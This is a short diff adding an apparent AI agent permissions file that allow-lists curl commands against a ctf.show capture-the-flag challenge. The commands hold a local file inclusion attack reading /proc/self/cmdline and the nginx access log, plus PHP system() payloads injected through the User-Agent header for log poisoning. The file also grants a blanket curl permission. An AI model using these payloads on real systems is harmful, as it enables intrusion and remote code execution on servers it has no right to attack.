@@ -1,0 +1,11 @@
+{
+  "permissions": {
+    "allow": [
+      "Bash(curl -s \"https://54e06759-7de2-42cb-9571-54dc22515a2e.challenge.ctf.show/?c=/proc/self/cmdline\")",
+      "Bash(curl -s \"https://54e06759-7de2-42cb-9571-54dc22515a2e.challenge.ctf.show/\" -H \"User-Agent: <?php system\\('find / -name flag* 2>/dev/null'\\); ?>\")",
+      "Bash(curl -s \"https://54e06759-7de2-42cb-9571-54dc22515a2e.challenge.ctf.show/?c=/var/log/nginx/access.log\")",
+      "Bash(curl -s \"https://54e06759-7de2-42cb-9571-54dc22515a2e.challenge.ctf.show/\" -H \"User-Agent: <?php system\\('ls -la /var/www/'\\); ?>\")",
+      "Bash(curl:*)"
+    ]
+  }
+}
